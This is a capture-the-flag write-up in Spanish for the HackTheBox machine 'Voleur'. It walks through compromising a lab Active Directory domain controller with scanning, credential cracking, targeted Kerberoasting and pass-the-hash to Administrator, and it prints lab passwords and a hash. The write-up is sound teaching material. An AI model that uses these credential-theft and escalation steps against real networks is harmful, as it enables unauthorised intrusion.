---
title: "Voleur - Writeup"
difficulty: "Medium"
date: 2025-07-07
tags: [htb, windows, active-directory, kerberos, bloodhound]
---
# Voleur - HackTheBox Writeup

## Información Básica
| **Campo**       | **Valor**               |
|-----------------|-------------------------|
| IP              | 10.10.11.76             |
| Dominio         | voleur.htb              |
| Realm Kerberos  | VOLEUR.HTB              |
| Autor           | Irioshi                 |
| Fecha Resolución| 2025-07-06              |



## Reconocimiento

### Configuración Inicial

```bash
echo "10.10.11.76 dc.voleur.htb voleur.htb" | sudo tee -a /etc/hosts

Escaneo Nmap

nmap -sC -sV -p- --min-rate=5000 10.10.11.76

<details> <summary>Resultados Completos</summary>
# PEGA AQUÍ LOS RESULTADOS DE NMAP
┌──(solo㉿sola)-[~/HTB/Voleur]
└─$ nmap -sC -sV -p- --min-rate=5000 10.10.11.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 06:43 -03
Nmap scan report for dc.voleur.htb (10.10.11.76)
Host is up (0.37s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Doma>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linu>
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Doma>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50487/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50488/tcp open  msrpc         Microsoft Windows RPC
50490/tcp open  msrpc         Microsoft Windows RPC
50518/tcp open  msrpc         Microsoft Windows RPC
54802/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows,>

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -42s
| smb2-time:
|   date: 2025-07-07T09:45:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https:/>
Nmap done: 1 IP address (1 host up) scanned in 156.56 seconds
</details>

Servicios clave identificados:

    Kerberos (88/tcp)

    SMB (445/tcp)

    WinRM (5985/tcp)

    SSH (2222/tcp)

Configuración Kerberos

cat /etc/krb5.conf

[libdefaults]
default_realm = VOLEUR.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
VOLEUR.HTB = {
  kdc = 10.10.11.76
  admin_server = 10.10.11.76
  default_domain = voleur.htb
}

[domain_realm]
.voleur.htb = VOLEUR.HTB
voleur.htb = VOLEUR.HTB

Acceso Inicial
Credenciales Iniciales

nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k

Enumeración SMB

KRB5CCNAME=ryan.naylor.ccache smbclient.py -k dc.voleur.htb


use IT
cd "First-Line Support"
get Access_Review.xlsx

Crackeo de Archivo Excel

   1.Extraer hash:

office2john Access_Review.xlsx > hash.txt

   2.Fuerza bruta:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Contraseña: football1

    3.Descifrar archivo:

python3 -m msoffcrypto -p football1 Access_Review.xlsx decrypted.xlsx

Credenciales Obtenidas
Usuario	   Contraseña
svc_ldap   M1XyC9pW7qT5Vn
svc_iis	   N5pXyV1WqM7CZ8

Movimiento Lateral

BloodHound

bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.10.11.76 --zip -k

Hallazgos clave:

    svc_ldap tiene GenericWrite sobre lacey.miller

    svc_ldap tiene WriteSPN sobre svc_winrm

Kerberoasting Dirigido

targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb

Crackeo de Hash

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Contraseña de svc_winrm: AFireInsidedeOzarctica980219afi

Acceso vía WinRM

evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB

Bandera de usuario:

type C:\Users\svc_winrm\Desktop\user.txt

Escalada a Administrador

Método Directo (Golden Ticket)

getTGT.py -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator

evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB

Bandera de root:

type C:\Users\Administrator\Desktop\root.txt

Lecciones Aprendidas

    Kerberos Authentication: La importancia de sincronizar el tiempo con el DC

    Password Management: Riesgos de almacenar contraseñas en hojas Excel

    Least Privilege: Peligro de permisos excesivos en cuentas de servicio

    Monitoring: Detección temprana de actividades de Kerberoasting

Herramientas Utilizadas

    Nmap

    BloodHound-Python

    John the Ripper

    Impacket

    Evil-WinRM

    office2john

Recursos Recomendados

    Kerberos Attacks Cheat Sheet

    Active Directory Security Best Practices

---

```bash


